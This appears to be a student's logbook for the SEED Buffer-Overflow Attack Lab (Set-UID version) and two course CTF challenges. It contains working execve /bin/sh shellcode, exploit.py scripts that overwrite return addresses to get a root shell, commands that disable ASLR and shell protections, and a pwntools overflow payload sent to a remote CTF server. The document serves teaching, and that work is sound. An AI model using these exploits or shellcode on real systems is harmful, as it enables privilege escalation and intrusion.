# Trabalho realizado na Semana #5 - SEED Labs - Buffer-Overflow Attack Lab (Set-UID Version)

To complete these tasks, we needed to disable the adress space randomization security mechanism, to make it easier to identify the adresses of the components and so that the address of the variables stay the same in each execution of a program

```
$ sudo sysctl -w kernel.randomize_va_space=0
```

Furthermore, since `/bin/dash` has an implemented security countermeasure that makes our attacks more difficult, we link `/bin/sh` to `/bin/zsh`, a shell that doesn't have such countermeasure and will let us create SET-UID attack programs

```
$ sudo ln -sf /bin/zsh /bin/sh
```

## Task 1: Getting Familiar with Shellcode
- We cannot just compile this code and use the binary code as our shellcode 

1. The best way to write a shellcode is to use assembly code. Given two versions, 32-bit and 64-bit

2. Explaining how the 32.bit version works
    - The third instruction pushes "//sh", rather than "/sh" into the stack. This is because we need a
32-bit number here, and "/sh" has only 24 bits. Fortunately, "//" is equivalent to "/", so we can
get away with a double slash symbol.
    - We need to pass three arguments to execve() via the ebx, ecx and edx registers, respectively.
The majority of the shellcode basically constructs the content for these three arguments.
    - The system call execve() is called when we set al to 0x0b, and execute "int 0x80".

**shellcode32:**
```c
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument

; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument

; For environment variable
xor edx, edx ; edx = 0: execve()’s 3rd argument

; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()’s system call number
int 0x80
```

3. The function to run the code assembly mencioned above was given to us:

**call_shellcode.c**
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] = 
#if __x86_64__
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
    char code[500];
    strcpy(code, shellcode); // Copy the shellcode to the stack
    int (*func)() = (int(*)())code;
    func(); // Invoke the shellcode from the stack
    return 1;
}
```

4. We now compile it. If we add the -m32 flag, the 32 bit version will run, if we don't the 64-bit version will run.

![Task1Make](/Logbooks/img/Week5/Task1Make.png)

## Task 2: Understanding the Vulnerable Program

1. They gave us the stack.c program:

**stack.c:**
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

2. This program has a buffer overflow vulnerability. It reads an input with a max of 517 bytes, passes it to another buffer in the bof() function. But since the buffer in bof() can only retain less than 517 bytes, a buffer overflow will occur. Since the file that we are reading from has user access, we can alter it to achieve a root shell.

3. Turn off the StackGuard and the non-executable stack protections using the -fno-stack-protector and "-z execstack"

```
$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
```

4. We need to make the program a root-owned Set-UID program so whe change the ownership of the program to root and then change the permission to 4777 to enable the SET-UID bit.

```
$ sudo chown root stack 
$ sudo chmod 4755 stack 
```

5. A Makefile is already given, but we change the values of L1, L2 and L3, being L4 a fixed number. We opted for L1=100, L2=160 and L3=200

6. We compiled it and checked the permissions, confirming the SET-UID bit

![Task2Make](/Logbooks/img/Week5/Task2Make.png)
![permissions](/Logbooks/img/Week5/permissions.png)


## Task 3: Launching Attack on 32-bit Program (Level 1)

1. We compiled and ran the given program to see the adresses of the variables in the stack

**gbd stack-L1-dbg:**

![gbdStack](/Logbooks/img/Week5/gbdStack.png)

**b bof and run:** (set a break point at function bof(), where the overflow will occur. It stops before the `ebp` register is set to point to the current stack frame)

![bBofAndRun](/Logbooks/img/Week5/bBofAndRun.png)

**next:** (to execute a few instructions and stop after the `ebp`register is modified to point to the stack frame of the bof() function)

![next](/Logbooks/img/Week5/next.png)

**p $ebd and p &buffer:** (get the value of ebp and buffer adress)

![pEbdAndBuffer](/Logbooks/img/Week5/pEBDandBuffer.png)


2. A python file, exploit.py, was given so that we can exploit the buffer overflow vulnerability in the target program, but it was given to us incomplete so we had to make some changes.

**exploit.py:** (incomplete file)
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x90\x90\x90\x90"  
  "\x90\x90\x90\x90"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00           # Change this number 
offset = 0              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

3. We made the following changes:
    - changed the `shellcode` value to the actual shellcode
    - changed the `start` value to `517 - len(shellcode)`, so that we place the end of the shellcode on the end of the buffer
    - changed the `ret` value to the adress where we want the program to jump to. We obtained this value by adding to the adress of the start of the buffer ($buffer) the value start (start == (517 - len(shellcode)) == 517 - 27 == 490). (0xffffc9ac + 490((in decimal) == 0x1ea in hexadecimal)) = 0xffffcb96.
    - changed the `offset` value to 112 that corresponds to the distance between the start of the buffer and the adress of return. ($ebp adress - $buffer address) = (0xffffca18 - 0xffffca6c) = 6c = 108 in decimal. So this means that $ebp starts at 108 bytes after the buffer and since it occupies 4 bytes we add that amount and we get the value of the offset, 112 bytes

**exploit.py:** (complete version)
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcb96       
offset = 112              

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

5. Running the script, we were able to execute the shellcode by buffer overflowing

```
$./exploit.py // create the badfile
$./stack-L1
```

![Task3.5](/Logbooks/img/Week5/Task3.5.png)


## Task 4: Launching Attack without Knowing Buffer Size (Level 2)

1. For this task, we reused the exploit.py and changed it into the exploit1.py file:

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               
content[start:] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca90 + 400

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

for offset in range(50):
  content[offset*L:offset*4 + L] = (ret).to_bytes(L, byteorder='little')

content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

2. Explaining the changes made:
    - We ran `gdb stack-L2-dbg` again and we verified that the $buffer variable was now `0xffffca90`. Because of that we changed the value of the `ret` variable to that address and added 400 since we want to ensure that the return address points to a location within the buffer where the shellcode will be executed when the vulnerable program tries to return from the bof() function
    - We maintained the value of start so that the shellcode situates at the end of the buffer
    - Since now we only know the address of the buffer (and not the frame pointer), we need a new way of attempting to overflow the buffer. To reach that objetive this portion of code became really useful `for offset in range(50):
  content[offset*L:offset*4 + L] = (ret).to_bytes(L, byteorder='little'). The goal is to overwrite multiple return address slots in the buffer with the same calculated value, which is the address that we want the program to jump to when returning from a function

3. After running the exploit, we checked for the ids and if we had root access:

![runExploit1](/Logbooks/img/runExploit1.png)



# CTF - Control The Flag

## Desafio 1:
1. Initially we started by installing the pwntools and the packet checksec, and the zip files containing an executable called program, a main.c file and a python script called exploit-example.py

2. Right after, we executed the checksec command on the terminal and we got the following results:

![checksec](/Logbooks/img/Week5/checksekProgram.png)

**Observations:**
- x86 Architecture
- No cannary to protect return adress
- Stack has execute permissions - NX
- The binary positions aren't randomized
- There are memory regions with RMX permissions (Read, Write and Execute)

3. We check the given program and python script, namely main.c and exploit-example.py:

**main.c:**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

**exploit-example.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()
```

**Observations:**
- There isn't a function that checks for overflows
- The buffer value is read through scanf(), an input function
- The file is saved in an array that is located right above the variable buffer
- Flag is saved in a text file called flag.txt


4. To cause an overflow, we should fill the buffer with an input of 32 characters and at the end, to open the file that contains the flag (flag.txt), we insert the name of that file.

5. This way, the flag.txt is going to be opened and the flag that it contains is going to be printed in the terminal:

![flag1](/Logbooks/img/Week5/flag.png)


## Desafio 2:

1. On this challenge, we now contain a different main.c file:

**main.c**
```c++
#include <stdio.h>
#include <stdlib.h>

int main() {
    char val[4] = "\xef\xbe\xad\xde";
    char meme_file[9] = "mem.txt\0\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%45s", &buffer);
    if(*(int*)val == 0xfefc2324) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

**Observations:**
In comparison with the previous main file:
- This one checks if a value as been altered without knowing `if(*(long*)val == 0xfefc2122)`
- There is another buffer called val that is situated between buffer and meme_file. This provides a little more protection.
- In case the value of val is not valid, an error message is printed

2. Initially, we started by executing again the checksec command, that gave us the same information

![checksec2](/Logbooks/img/Week5/checksekProgram2.png)

3. To overflow this system we follow the same strategy from the previous *Desafio* but now we should also add to the input the address that is beeing compared to the val buffer (0xfefc2122), used to check if something was adulterated

4. To do such thing, we changed the given exploit-example.py so that the main.c function receives the exact input to unlock the flag contained in the flag.txt file. We named that script exploit.py

**exploit.py:**
```python
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"qwertyuiopasdfghjklzxcvbnmqwerty\x24\x23\xfc\xfeflag.txt")
r.interactive()
```

4. Finally, we obtained the following results:

![flag2](/Logbooks/img/Week5/flag2.png)
